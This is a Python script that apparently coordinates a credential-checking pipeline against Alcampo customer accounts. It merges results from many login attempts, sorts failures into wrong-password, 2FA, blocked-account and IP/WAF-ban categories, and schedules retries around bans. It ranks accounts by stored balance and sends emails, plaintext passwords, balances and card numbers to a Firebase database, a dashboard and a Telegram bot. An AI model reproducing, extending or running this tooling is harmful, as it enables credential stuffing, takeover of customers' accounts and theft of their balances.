import os
import sys
import glob
import json
import re
import html
import base64
import argparse
import time
from datetime import datetime, timezone
import pandas as pd
import requests

# Force UTF-8 on Windows consoles to prevent UnicodeEncodeError with emojis
if sys.platform.startswith("win"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass


# Dynamic scraper directory resolution
scraper_dir = os.path.join(os.path.dirname(__file__), "..", "scraper")
if not os.path.exists(scraper_dir):
    scraper_dir = os.path.join(os.path.dirname(__file__), "..", "script_alcampo_activacion telegram")
scraper_dir = os.path.abspath(scraper_dir)
if os.path.exists(scraper_dir) and scraper_dir not in sys.path:
    sys.path.append(scraper_dir)

def parse_args():
    parser = argparse.ArgumentParser(description="Merge and Retry Helper for Alcampo GitHub Actions Pipeline")
    parser.add_argument("--mode", choices=["check-timeouts", "final-merge"], required=True)
    parser.add_argument("--input-dir", default="./all_shards", help="Directory containing shard Excel files")
    parser.add_argument("--single-file", default=None, help="Inspect a specific single Excel file instead of a directory")
    parser.add_argument("--failed-json", default="failed_accounts.json", help="Path to write failed accounts JSON")
    parser.add_argument("--output-excel", default="REPORTE_DEFINITIVO_TELEGRAM.xlsx", help="Final output Excel path")
    parser.add_argument("--accounts-file", default=None, help="Path to master accounts JSON file")
    return parser.parse_args()

def limpiar_saldo(saldo_str):
    if not saldo_str or pd.isna(saldo_str):
        return None
    match = re.search(r"([0-9]+[.,][0-9]{2}|[0-9]+)", str(saldo_str))
    if match:
        return float(match.group(0).replace(',', '.'))
    return None

def compute_priority(filename, saldo_str):
    """Calculates row priority matching multi-pass merge rules."""
    base_prio = 10
    fn = os.path.basename(str(filename)).lower()
    if "cycle_" in fn:
        try:
            c_num = int(fn.split("cycle_")[1].split(".")[0].split("_")[0])
            base_prio = 100 + c_num * 10
        except Exception:
            base_prio = 100
    elif "retry" in fn or "pass2" in fn:
        base_prio = 100

    if "Tu Saldo es" in str(saldo_str):
        return base_prio + 1000
    return base_prio

def is_definitive_success(saldo_str):
    if not saldo_str or pd.isna(saldo_str):
        return False
    return "Tu Saldo es" in str(saldo_str)

def is_definitive_error(saldo_str, causa_str="", err_type=""):
    """
    Returns True if an account failure is permanent at the account level (credentials, call center, 2FA)
    and should not be retried in Pass 2.
    """
    combined = f"{saldo_str} {causa_str} {err_type}".lower()
    
    # 1. Call Center, 2FA, Blocked Account
    if any(k in combined for k in [
        "call center", "cuenta ha sido bloqueada", "cuenta bloqueada", 
        "btnpwreset", "restablecer contraseña", "restablecer contrasena", 
        "código de verificación", "codigo de verificacion", "2fa",
        "identity verification", "device activation", "needs_attention"
    ]):
        return True

    # 2. Permanent Account Credentials Error
    if any(k in combined for k in [
        "credenciales incorrectas", "usuario o contraseña incorrectos", 
        "usuario o contrasena incorrectos", "contraseña no válida", 
        "contrasena no valida", "usuario incorrecto", 
        "credenciales no redirigidas", "authenticationerror", 
        "account_error"
    ]) and not any(k in combined for k in ["timeout", "bloqueo/timeout", "waf", "ip_error"]):
        return True

    return False

def is_retryable_failure(saldo_str, causa_str="", err_type=""):
    """
    Returns True if failure is due to timeout, session delay, WAF, IP ban, or incomplete execution.
    """
    if is_definitive_success(saldo_str):
        return False
    if is_definitive_error(saldo_str, causa_str, err_type):
        return False
    return True

def load_master_accounts(accounts_file_arg=None):
    """
    Loads the master accounts dataset to detect and recover any unreached/crashed accounts.
    """
    candidates = []
    if accounts_file_arg:
        candidates.append(accounts_file_arg)
    candidates.append(os.path.join(os.path.dirname(__file__), "..", "scraper", "accounts.json"))
    candidates.append(os.path.join(os.path.dirname(__file__), "..", "accounts.json"))
    candidates.append("accounts.json")

    for cand in candidates:
        if cand and os.path.exists(cand) and os.path.getsize(cand) > 10:
            try:
                with open(cand, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    if isinstance(data, list) and len(data) > 0:
                        return data
            except Exception as e:
                print(f"Warning loading master accounts from {cand}: {e}")

    # Fallback to ACCOUNTS_BASE64 env var
    b64_val = os.environ.get("ACCOUNTS_BASE64", "")
    if b64_val and len(b64_val.strip()) > 10:
        try:
            raw_b = base64.b64decode(b64_val.strip())
            if len(raw_b) >= 2 and raw_b[0] == 0x1F and raw_b[1] == 0x8B:
                import gzip
                raw_b = gzip.decompress(raw_b)
            decoded = json.loads(raw_b.decode("utf-8"))
            if isinstance(decoded, list):
                return decoded
        except Exception as be:
            print(f"Warning decoding ACCOUNTS_BASE64: {be}")

    return []

def format_telegram_summary(total, saldo_total, cuentas_dinero, cuentas_cero, cuentas_error, top_10, error_summary=None):
    """
    Formats the final Telegram summary message with 100% strict HTML escaping
    on all dynamic and external fields (emails, error descriptions).
    """
    top_10_lines = []
    if top_10:
        for i, item in enumerate(top_10):
            clean_email = html.escape(str(item[1]))
            top_10_lines.append(f"   {i+1}. {clean_email} ({item[0]:.2f} €)")
    top_10_str = "\n".join(top_10_lines) if top_10_lines else "   N/A"

    msg = (
        f"📊 <b>RESUMEN CONSOLIDADO FINAL (2 PASADAS MATRIZ)</b>\n\n"
        f"✅ Cuentas totales: {total}\n"
        f"💰 <b>Saldo Total Extraído:</b> {saldo_total:.2f} €\n"
        f"💎 Cuentas con dinero: {cuentas_dinero}\n"
        f"💤 Cuentas con saldo 0: {cuentas_cero}\n"
        f"⚠️ Cuentas con error / Call Center: {cuentas_error}\n\n"
        f"🏆 <b>Top 10 Cuentas con Mayor Saldo:</b>\n{top_10_str}\n\n"
        f"👀 <b>Ver Dashboard y Centro QR:</b>\n"
        f"https://script-alcampo.vercel.app/"
    )
    if error_summary:
        clean_summary = html.escape(str(error_summary))
        msg += f"\n\nℹ️ <b>Diagnóstico:</b> {clean_summary}"
    if len(msg) > 4000:
        msg = msg[:3980] + "\n... [truncado]"
    return msg

def get_telegram_config():
    token = (os.environ.get("TELEGRAM_TOKEN") or "").strip()
    chat_id = (os.environ.get("TELEGRAM_CHAT_ID") or "").strip()
    
    is_valid_token = bool(re.match(r"^\d+:[A-Za-z0-9_-]+$", token)) and token.lower() not in ("none", "null", "***", "undefined")
    
    is_valid_chat = False
    if chat_id and chat_id.lower() not in ("none", "null", "***", "undefined"):
        try:
            int(chat_id)
            is_valid_chat = True
        except ValueError:
            pass
            
    if not is_valid_token or not is_valid_chat:
        return None, None
        
    return token, int(chat_id)

def enviar_telegram(token, chat_id, texto, excel_path):
    try:
        url_msg = f"https://api.telegram.org/bot{token}/sendMessage"
        r_msg = requests.post(url_msg, data={"chat_id": chat_id, "text": texto, "parse_mode": "HTML"}, timeout=15)
        print(f"📡 [TELEGRAM MENSAJE] Status: {r_msg.status_code} - Response: {r_msg.text[:120]}")
        
        if os.path.exists(excel_path):
            url_doc = f"https://api.telegram.org/bot{token}/sendDocument"
            with open(excel_path, "rb") as f:
                r_doc = requests.post(url_doc, data={"chat_id": chat_id, "caption": "📊 Reporte Maestro Consolidado de Saldos Alcampo"}, files={"document": f}, timeout=25)
            print(f"📁 [TELEGRAM EXCEL] Status: {r_doc.status_code} - Response: {r_doc.text[:120]}")
        print("🎉 Telegram notificado con éxito.")
    except Exception as e:
        print(f"⚠️ Error enviando a Telegram: {e}")

def collect_failed_accounts(files, master_accounts=None):
    """
    Scans shard Excel files and cross-references against master_accounts (if provided)
    to collect accounts needing retry in Pass 2:
    1. Accounts present in shards that failed with retryable errors (timeouts, session errors, IP/WAF 429).
    2. Master accounts that were omitted / never reached due to shard crashes or premature timeouts.
    Excludes definitive successes ("Tu Saldo es...") and permanent errors (bad credentials, call center, 2FA).

    Returns:
        List of dicts: [{'email': ..., 'password': ...}]
    """
    if master_accounts is None:
        master_accounts = []

    scraped_by_email = {}
    for f in files:
        if not f or not os.path.exists(f):
            continue
        try:
            df = pd.read_excel(f)
            for _, row in df.iterrows():
                em = str(row.get("email", "")).strip()
                if not em or em.lower() in ("none", "nan", ""):
                    continue
                scraped_by_email[em] = {
                    "email": em,
                    "password": str(row.get("password", "")).strip(),
                    "saldo": str(row.get("saldo", "")).strip(),
                    "causa_error": str(row.get("causa_error", "")).strip(),
                    "error_type": str(row.get("error_type", "")).strip(),
                }
        except Exception as e:
            print(f"Error leyendo {f}: {e}")

    failed_accounts = []
    seen_emails = set()

    # 1. Accounts in scraped Excel with retryable errors
    for em, data in scraped_by_email.items():
        if is_retryable_failure(data["saldo"], data["causa_error"], data["error_type"]):
            if em not in seen_emails:
                failed_accounts.append({
                    "email": em,
                    "password": data["password"]
                })
                seen_emails.add(em)

    # 2. Master accounts that were NEVER reached by shards or not definitive
    for acc in master_accounts:
        em = str(acc.get("email", "")).strip()
        if not em:
            continue
        if em not in scraped_by_email:
            # Incomplete shard! Account was omitted from shard output
            if em not in seen_emails:
                failed_accounts.append({
                    "email": em,
                    "password": str(acc.get("password", "")).strip()
                })
                seen_emails.add(em)
        else:
            data = scraped_by_email[em]
            if is_retryable_failure(data["saldo"], data["causa_error"], data["error_type"]):
                if em not in seen_emails:
                    failed_accounts.append({
                        "email": em,
                        "password": str(acc.get("password", "")).strip() or data["password"]
                    })
                    seen_emails.add(em)

    return failed_accounts


def generate_consolidated_excel(df_all, output_excel_path=None):
    """
    Partitions df_all into 6 mutually exclusive categorization sheets:
    1. 'Todas las Cuentas': Master consolidated dataset
    2. 'Exitosas con Saldo': Positive balance (> 0,00 €)
    3. 'Saldo Cero Verificado': Confirmed 0,00 € balance
    4. 'Bloqueadas Call Center': Call center, 2FA, password reset
    5. 'Error Credenciales': Invalid user or password
    6. 'Error IP y Timeouts': Session timeouts, 429 WAF, network blocks

    Strips all temporary evaluation columns before saving.
    If output_excel_path is provided, writes the workbook using openpyxl.

    Returns:
        dict: Mapping of sheet names to clean DataFrames.
    """
    df_working = df_all.copy()
    for col in ["email", "saldo", "card_number", "password", "_priority", "causa_error", "error_type"]:
        if col not in df_working.columns:
            df_working[col] = ""

    saldo_vals = []
    is_successes = []
    is_callcenters = []
    is_credenciales_list = []

    for _, row in df_working.iterrows():
        s_str = str(row.get("saldo", "")).strip()
        c_str = str(row.get("causa_error", "")).strip()
        e_str = str(row.get("error_type", "")).strip()
        combined = f"{s_str} {c_str} {e_str}".lower()

        val = limpiar_saldo(s_str)
        succ = ("Tu Saldo es" in s_str) and (val is not None)

        cc = any(k in combined for k in [
            "call center", "cuenta ha sido bloqueada", "cuenta bloqueada",
            "btnpwreset", "restablecer contraseña", "restablecer contrasena",
            "código de verificación", "codigo de verificacion", "2fa",
            "identity verification", "device activation", "needs_attention"
        ])

        cred = any(k in combined for k in [
            "credenciales incorrectas", "usuario o contraseña incorrectos",
            "usuario o contrasena incorrectos", "contraseña no válida",
            "contrasena no valida", "usuario incorrecto",
            "credenciales no redirigidas", "authenticationerror",
            "account_error"
        ]) and not cc

        saldo_vals.append(val)
        is_successes.append(succ)
        is_callcenters.append(cc)
        is_credenciales_list.append(cred)

    df_working["_saldo_val"] = saldo_vals
    df_working["_is_success"] = is_successes
    df_working["_is_callcenter"] = is_callcenters
    df_working["_is_credenciales"] = is_credenciales_list

    df_con_saldo = df_working[df_working["_is_success"] & (df_working["_saldo_val"] > 0)].copy()
    df_saldo_cero = df_working[df_working["_is_success"] & (df_working["_saldo_val"] == 0)].copy()
    df_callcenter = df_working[~df_working["_is_success"] & df_working["_is_callcenter"]].copy()
    df_credenciales = df_working[~df_working["_is_success"] & ~df_working["_is_callcenter"] & df_working["_is_credenciales"]].copy()
    df_ip_timeouts = df_working[~df_working["_is_success"] & ~df_working["_is_callcenter"] & ~df_working["_is_credenciales"]].copy()

    temp_cols = ["_priority", "_saldo_val", "_is_success", "_is_callcenter", "_is_credenciales"]

    def clean_sheet_df(df_target):
        clean_df = df_target.copy()
        clean_df.drop(columns=[c for c in temp_cols if c in clean_df.columns], errors="ignore", inplace=True)
        return clean_df

    sheets = {
        "Todas las Cuentas": clean_sheet_df(df_working),
        "Exitosas con Saldo": clean_sheet_df(df_con_saldo),
        "Saldo Cero Verificado": clean_sheet_df(df_saldo_cero),
        "Bloqueadas Call Center": clean_sheet_df(df_callcenter),
        "Error Credenciales": clean_sheet_df(df_credenciales),
        "Error IP y Timeouts": clean_sheet_df(df_ip_timeouts),
    }

    if output_excel_path:
        out_dir = os.path.dirname(output_excel_path)
        if out_dir and not os.path.exists(out_dir):
            os.makedirs(out_dir, exist_ok=True)
        with pd.ExcelWriter(output_excel_path, engine="openpyxl") as writer:
            for sname, sdf in sheets.items():
                sdf.to_excel(writer, sheet_name=sname, index=False)

    return sheets


def main():
    args = parse_args()
    
    if args.mode == "check-timeouts":
        if args.single_file and os.path.exists(args.single_file):
            files = [args.single_file]
        else:
            raw_files = []
            if args.input_dir and os.path.exists(args.input_dir):
                for ext in ["*.xlsx", "*.XLSX"]:
                    raw_files.extend(glob.glob(os.path.join(args.input_dir, "**", ext), recursive=True))
            if not raw_files and os.path.exists("./pass1_artifacts"):
                for ext in ["*.xlsx", "*.XLSX"]:
                    raw_files.extend(glob.glob(os.path.join("./pass1_artifacts", "**", ext), recursive=True))

            shard_pattern = re.compile(r"(pass|shard|retry|cycle)", re.IGNORECASE)
            files = [f for f in raw_files if shard_pattern.search(os.path.basename(f))]

        print(f"🔎 Inspeccionando {len(files)} archivo(s)...")

        # Load master accounts if known to prevent dropping unreached accounts
        master_accounts = []
        if files or args.accounts_file:
            master_accounts = load_master_accounts(args.accounts_file)
        if master_accounts:
            print(f"📋 Cuentas maestras cargadas: {len(master_accounts)}")

        failed_accounts = collect_failed_accounts(files, master_accounts)
        print(f"🔴 Cuentas con timeout o pendientes detectadas para reintento: {len(failed_accounts)}")

        # Check for stagnation / lack of progress in retries (Early Exit Guard)
        prev_history_file = "previous_failures.json"
        is_stagnant = False
        if len(failed_accounts) > 0 and os.path.exists(prev_history_file):
            try:
                with open(prev_history_file, "r", encoding="utf-8") as pf:
                    prev_data = json.load(pf)
                    prev_count = prev_data.get("count", 0)
                if len(failed_accounts) >= prev_count:
                    is_stagnant = True
                    print(f"⚠️ [EARLY EXIT] Los fallos no disminuyeron ({prev_count} → {len(failed_accounts)}). Abortando reintentos adicionales para proteger minutos de GitHub Actions.")
            except Exception as pe:
                print(f"Warning reading failure history: {pe}")

        if len(failed_accounts) > 0 and not is_stagnant:
            try:
                with open(prev_history_file, "w", encoding="utf-8") as pf:
                    json.dump({"count": len(failed_accounts)}, pf)
            except Exception:
                pass

        has_timeouts = "true" if (len(failed_accounts) > 0 and not is_stagnant) else "false"
        if len(failed_accounts) > 0 and not is_stagnant:
            with open(args.failed_json, "w", encoding="utf-8") as f:
                json.dump(failed_accounts, f, ensure_ascii=False, indent=2)
            print(f"💾 Cuentas fallidas guardadas en {args.failed_json}")
            
            # Update Firebase RTDB progress node for Cycle 2 retry state
            firebase_url = os.environ.get("FIREBASE_DB_URL") or "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
            if firebase_url:
                try:
                    fb_base = firebase_url.strip().rstrip("/")
                    requests.patch(f"{fb_base}/progress.json", json={
                        "cycle": 2,
                        "retry_total": len(failed_accounts),
                        "is_finished": False
                    }, timeout=5)
                except Exception as fe:
                    print(f"Warning updating retry state in Firebase: {fe}")
        else:
            if os.path.exists(args.failed_json):
                os.remove(args.failed_json)
            
        # Write to GITHUB_OUTPUT if available
        if "GITHUB_OUTPUT" in os.environ:
            with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as f:
                f.write(f"has_timeouts={has_timeouts}\n")
                f.write(f"failed_count={len(failed_accounts)}\n")

    elif args.mode == "final-merge":
        # Search ONLY explicit input_dir first; fall back ONLY to artifacts folders if empty
        raw_files = []
        if args.single_file and os.path.exists(args.single_file):
            raw_files = [args.single_file]
        else:
            if args.input_dir and os.path.exists(args.input_dir):
                for ext in ["*.xlsx", "*.XLSX"]:
                    raw_files.extend(glob.glob(os.path.join(args.input_dir, "**", ext), recursive=True))

            # Strict fallback ONLY if input_dir yielded no files.
            # STRICTLY PROHIBITED from searching '.' or 'scraper' to prevent absorbing historical artifacts!
            if not raw_files:
                for fallback_dir in ["./all_final_shards", "./pass1_artifacts"]:
                    if os.path.exists(fallback_dir):
                        for ext in ["*.xlsx", "*.XLSX"]:
                            raw_files.extend(glob.glob(os.path.join(fallback_dir, "**", ext), recursive=True))
                        if raw_files:
                            break

        # Filter strictly: prohibit output_excel and require shard filename pattern
        shard_pattern = re.compile(r"(pass|shard|retry|cycle)", re.IGNORECASE)
        files = []
        for f in raw_files:
            if os.path.abspath(f) == os.path.abspath(args.output_excel):
                continue
            fname = os.path.basename(f)
            if args.single_file or shard_pattern.search(fname):
                if f not in files:
                    files.append(f)

        print(f"📂 Archivos acumulados para consolidación final: {len(files)}")

        dfs = []
        for f in files:
            try:
                df = pd.read_excel(f)
                filename = os.path.basename(f)
                df["_priority"] = [compute_priority(filename, r.get("saldo", "")) for _, r in df.iterrows()]
                dfs.append(df)
            except Exception as e:
                print(f"Error leyendo {f}: {e}")

        if not dfs:
            print("❌ No se encontraron archivos para consolidar.")
            token, chat_id = get_telegram_config()
            if token and chat_id:
                enviar_telegram(token, chat_id, "⚠️ <b>Alerta Alcampo Scraper</b>: La consolidación final no encontró archivos Excel de los shards. Verifica los logs de la Pasada 1.", "")
            return

        df_all = pd.concat(dfs, ignore_index=True)
        for col in ["email", "saldo", "card_number", "password", "_priority"]:
            if col not in df_all.columns:
                df_all[col] = ""
        df_all.sort_values(by=["_priority"], inplace=True)
        df_all.drop_duplicates(subset=["email"], keep="last", inplace=True)

        sheets = generate_consolidated_excel(df_all, args.output_excel)
        df_con_saldo = sheets["Exitosas con Saldo"]
        df_saldo_cero = sheets["Saldo Cero Verificado"]
        df_callcenter = sheets["Bloqueadas Call Center"]
        df_credenciales = sheets["Error Credenciales"]
        df_ip_timeouts = sheets["Error IP y Timeouts"]

        print(f"💾 Reporte consolidado final guardado en {args.output_excel} (6 hojas)")
        
        # Calculate summary metrics
        total = len(df_all)
        saldo_total = 0.0
        cuentas_dinero = len(df_con_saldo)
        cuentas_cero = len(df_saldo_cero)
        cuentas_error = len(df_callcenter) + len(df_credenciales) + len(df_ip_timeouts)
        ranked = []
        top_10_json = []

        for _, row in df_con_saldo.iterrows():
            val = limpiar_saldo(row.get("saldo"))
            if val is not None and val > 0:
                saldo_total += val
                email = str(row.get("email", "")).strip()
                password = str(row.get("password", "")).strip()
                card_num = row.get("card_number") if "card_number" in row else row.get("tarjeta") if "tarjeta" in row else None
                card_str = str(card_num).strip() if (card_num and not pd.isna(card_num)) else None
                ranked.append((val, email, password, card_str))

        ranked.sort(key=lambda x: x[0], reverse=True)
        top_10 = ranked[:10]

        for val, email, password, card_str in top_10:
            top_10_json.append({
                "email": email,
                "password": password,
                "balance": round(val, 2),
                "card_number": card_str
            })

        # Save top_accounts.json locally and in dashboard/
        with open("top_accounts.json", "w", encoding="utf-8") as tf:
            json.dump(top_10_json, tf, ensure_ascii=False, indent=2)

        dashboard_dir = os.path.join(os.path.dirname(__file__), "..", "dashboard")
        dashboard_dir = os.path.abspath(dashboard_dir)
        if os.path.exists(dashboard_dir):
            with open(os.path.join(dashboard_dir, "top_accounts.json"), "w", encoding="utf-8") as tf:
                json.dump(top_10_json, tf, ensure_ascii=False, indent=2)

        # Update account_status.json with final consolidated results
        try:
            from account_cooldown_manager import AccountCooldownManager
            cd_mgr = AccountCooldownManager()
            for _, row in df_all.iterrows():
                em = str(row.get("email", "")).strip()
                if not em:
                    continue
                s_val = str(row.get("saldo", ""))
                v_num = limpiar_saldo(s_val)
                is_ok = (v_num is not None and "Error" not in s_val and "No encontrado" not in s_val and "Call Center" not in s_val)
                cd_mgr.record_result(em, is_ok, error_msg=s_val)
            cd_mgr.save()
            print("✔ account_status.json consolidado guardado exitosamente.")
        except Exception as c_ex:
            print(f"Warning actualizando account_status.json: {c_ex}")

        # Update dashboard/history.json
        history_path = os.path.join(dashboard_dir, "history.json") if os.path.exists(dashboard_dir) else "history.json"
        history_data = []
        if os.path.exists(history_path):
            try:
                with open(history_path, "r", encoding="utf-8") as hf:
                    history_data = json.load(hf)
                    if not isinstance(history_data, list):
                        history_data = []
            except Exception:
                history_data = []

        next_id = 1
        if history_data:
            next_id = max([e.get("id", 0) for e in history_data if isinstance(e, dict)] or [0]) + 1

        successes = cuentas_dinero + cuentas_cero
        success_rate = (successes / total * 100) if total > 0 else 0.0

        new_history_entry = {
            "id": next_id,
            "date": datetime.now(timezone.utc).isoformat(),
            "version": "Multi-VM Matrix 2-Pass",
            "duration": 180.0,
            "checked": total,
            "success": successes,
            "zero": cuentas_cero,
            "error": cuentas_error,
            "success_rate": round(success_rate, 2),
            "total_balance": round(saldo_total, 2)
        }
        history_data.append(new_history_entry)

        with open(history_path, "w", encoding="utf-8") as hf:
            json.dump(history_data, hf, ensure_ascii=False, indent=4)

        # Push to Firebase Realtime DB
        firebase_url = os.environ.get("FIREBASE_DB_URL") or "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
        if firebase_url:
            try:
                fb_base = firebase_url.strip().rstrip("/")
                requests.put(f"{fb_base}/top_accounts.json", json=top_10_json, timeout=10)
                requests.put(f"{fb_base}/history.json", json=history_data, timeout=10)
                
                prog_snap = {
                    "total": total,
                    "processed": total,
                    "success": successes,
                    "money": cuentas_dinero,
                    "zero": cuentas_cero,
                    "error": cuentas_error,
                    "total_balance": round(saldo_total, 2),
                    "is_finished": True,
                    "timestamp": time.time()
                }
                requests.put(f"{fb_base}/progress.json", json=prog_snap, timeout=10)
                print("✔ [FIREBASE] Sincronización exitosa de /top_accounts.json, /history.json y /progress.json")
            except Exception as fe:
                print(f"⚠️ Error al sincronizar con Firebase: {fe}")

        msg = format_telegram_summary(
            total=total,
            saldo_total=saldo_total,
            cuentas_dinero=cuentas_dinero,
            cuentas_cero=cuentas_cero,
            cuentas_error=cuentas_error,
            top_10=top_10
        )

        token, chat_id = get_telegram_config()
        if token and chat_id:
            enviar_telegram(token, chat_id, msg, args.output_excel)

if __name__ == "__main__":
    main()
